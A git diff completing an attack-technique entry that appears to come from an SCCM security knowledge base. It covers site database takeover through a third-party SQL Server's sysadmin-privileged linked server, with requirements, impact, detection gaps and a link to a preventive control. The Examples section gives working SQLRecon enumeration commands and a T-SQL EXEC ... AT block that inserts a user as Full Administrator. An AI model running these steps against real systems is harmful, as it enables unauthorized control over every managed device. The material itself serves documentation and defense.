@@ -1,24 +1,99 @@
 # TAKEOVER-9
 
 ## Description
-Crawl site database links configured with DBA privileges
+Site database takeover via SQL Server linked-server abuse from a third-party system
 
 ## MITRE ATT&CK TTPs
-- [TTP-ID](https://attack.mitre.org/LINK) - Description
+- [TA0008](https://attack.mitre.org/tactics/TA0008) - Lateral Movement
+- [TA0004](https://attack.mitre.org/tactics/TA0004) - Privilege Escalation
 
 ## Requirements
--
--
+- A third-party SQL Server instance (a non-SCCM system) has a linked server configured that points at an SCCM site database.
+- The linked server is configured with a **stored remote credential** (fixed login, not `uses_self_credential`) that is a member of the `sysadmin` server role on the target site database.
+- Attacker foothold on the third-party SQL Server sufficient to execute queries against a linked server:
+    - a valid login on the third-party SQL (any privilege level; permission to invoke linked-server queries via the `public` role is typical), or
+    - command execution on the third-party host (LOCAL SYSTEM / SQL service account context is sufficient), or
+    - NTLM coercion + relay to the third-party SQL leading to either of the above.
+- Target site database settings:
+    - The linked-server remote credential is a member of the `sysadmin` fixed server role on the site database [DEFAULT if the third-party integration was configured with a DBA-privileged account].
+    - Site database `RestrictReceivingNTLMTraffic` = `0` or not present [DEFAULT] (only relevant if the third-party SQL initiates the outbound connection via NTLM; a stored SQL login bypasses this).
 
 ## Summary
+SCCM's own hierarchy replication uses SQL Server Service Broker and a linked server between the CAS and each primary site database that is configured with pass-through Windows authentication (`uses_self_credential = 1`). Those SCCM-managed links do not by themselves expose the site database to takeover.
+
+The vulnerable pattern occurs when a **third-party product** (backup/recovery software, endpoint monitoring, asset/inventory management, custom reporting or data-warehouse ETL, and similar) is granted read access to the SCCM site database by way of a **linked server on the third-party SQL instance** that stores a **fixed remote credential** with `sysadmin` on the site database. Administrators typically configure this pattern for convenience — a single privileged login allows the third-party product to query any SCCM data it needs without permission tuning. Once created, the linked server persists indefinitely, is invisible from the site database side (linked-server definitions are stored on the initiating instance's `sys.servers` / `sys.linked_logins`, not the target), and is rarely audited.
+
+An attacker who obtains a foothold on the third-party SQL instance — or on a system whose credentials can query it — can enumerate the linked servers with a tool such as `SQLRecon`, identify the SA-privileged hop to the SCCM site database, and execute arbitrary Transact-SQL on the site database via `EXECUTE (...) AT [LinkedServerName]`. Because the remote credential is a member of `sysadmin`, the attacker gains full control over the site database and can grant themselves the SCCM "Full Administrator" role by writing directly to the `RBAC_Admins` and `RBAC_ExtendedPermissions` tables (identical post-exploitation to TAKEOVER-1 / TAKEOVER-2 / TAKEOVER-3 after site-database access is obtained).
+
+The attack is difficult to detect from the SCCM operator's perspective:
+- Linked-server definitions live on the initiating (third-party) side. Auditing `sys.servers` on the site database will not surface them.
+- The credential presented to the site database at attack time is the legitimate stored login, so authentication logs on the site database look normal.
+- Third-party SQL instances often fall outside the SCCM team's operational scope and are inspected less rigorously than SCCM's own site systems.
 
 ## Impact
+The "Full Administrator" security role is granted all permissions in Configuration Manager for all scopes and all collections. An attacker with this privilege can execute arbitrary programs on any client device that is online as SYSTEM, the currently logged on user, or as a specific user when they next log on. They can also leverage tools such as CMPivot and Run Script to query or execute scripts on client devices in real-time using the AdminService or WMI on an SMS Provider.
+
+Additionally, `sysadmin` on the site database enables direct database-tier operations (schema modification, data exfiltration of inventory / secret material stored in Configuration Manager, and `xp_cmdshell` execution as the SQL service account on the site-database host if `xp_cmdshell` is or can be enabled).
 
 ## Defensive IDs
-- [Prevent-19: Remove unnecessary links to site databases](../../../defense-techniques/PREVENT/PREVENT-19/prevent-19_description.md)
+- [PREVENT-19: Remove unnecessary links to site databases](../../../defense-techniques/PREVENT/PREVENT-19/prevent-19_description.md)
 
 ## Examples
+The following example assumes the attacker has already obtained the ability to execute queries on a third-party SQL Server instance (`thirdparty-sql.corp.local`) that has a linked server named `SCCMSITEDB` pointing at the primary site database (`ps1-db.mayyhem.com`) with a stored login granted `sysadmin`. The end state is the same as TAKEOVER-1 / TAKEOVER-3: the attacker is added to `RBAC_Admins` as a Full Administrator.
 
+1. On the third-party SQL Server, enumerate linked servers and identify hops with `sysadmin` on the remote instance using `SQLRecon`:
+
+    ```
+    SQLRecon.exe -a WindowsInteractive -s thirdparty-sql.corp.local -m links
+    [+] Discovered linked SQL server: SCCMSITEDB (ps1-db.mayyhem.com)
+
+    SQLRecon.exe -a WindowsInteractive -s thirdparty-sql.corp.local -m lwhoami -l SCCMSITEDB
+    [+] Executing @@servername, system_user via linked server SCCMSITEDB:
+    [+] server: ps1-db, user: MAYYHEM\svc_thirdparty_sccm_link
+    [+] sysadmin: True
+    ```
+
+2. Retrieve the hex-formatted SID of the Active Directory user to be elevated (see TAKEOVER-1 for the `sccmhunter mssql` / `SharpSCCM local user-sid` recipe). Assume:
+
+    ```
+    User:   MAYYHEM\lowpriv
+    SID:    S-1-5-21-...-1112
+    SID hex: 0x010500000000000515000000D75D21256B6364FD4D95C88158040000
+    Site:   PS1
+    ```
+
+3. On the third-party SQL Server, execute the RBAC-insert query on the linked instance. The `EXECUTE ... AT` form runs the query on the remote database in the linked login's session, which has `sysadmin`:
+
+    ```sql
+    EXEC ('
+      USE CM_PS1;
+      INSERT INTO RBAC_Admins
+        (AdminSID, LogonName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite)
+        VALUES (0x010500000000000515000000D75D21256B6364FD4D95C88158040000,
+                ''MAYYHEM\lowpriv'', 0, 0, '''', '''', '''', '''', ''PS1'');
+      INSERT INTO RBAC_ExtendedPermissions
+        (AdminID, RoleID, ScopeID, ScopeTypeID)
+        VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = ''MAYYHEM\lowpriv''),
+                ''SMS0001R'', ''SMS00ALL'', ''29'');
+      INSERT INTO RBAC_ExtendedPermissions
+        (AdminID, RoleID, ScopeID, ScopeTypeID)
+        VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = ''MAYYHEM\lowpriv''),
+                ''SMS0001R'', ''SMS00001'', ''1'');
+      INSERT INTO RBAC_ExtendedPermissions
+        (AdminID, RoleID, ScopeID, ScopeTypeID)
+        VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = ''MAYYHEM\lowpriv''),
+                ''SMS0001R'', ''SMS00004'', ''1'');
+    ') AT [SCCMSITEDB];
+    ```
+
+    `SQLRecon`'s query mode simplifies the syntax:
+
+    ```
+    SQLRecon.exe -a WindowsInteractive -s thirdparty-sql.corp.local -m lquery -l SCCMSITEDB -q "USE CM_PS1; INSERT INTO RBAC_Admins ... "
+    ```
+
+4. Confirm that `MAYYHEM\lowpriv` now holds the Full Administrator role in the SCCM console or via `AdminService`.
 
 ## References
 - Sanjiv Kawa, [SQLRecon](https://github.com/skahwah/SQLRecon)
+- Chris Thompson (Mayyhem), clarification of TAKEOVER-9 abuse scenario, SpecterOps SCCM community Slack, 2026-08-21
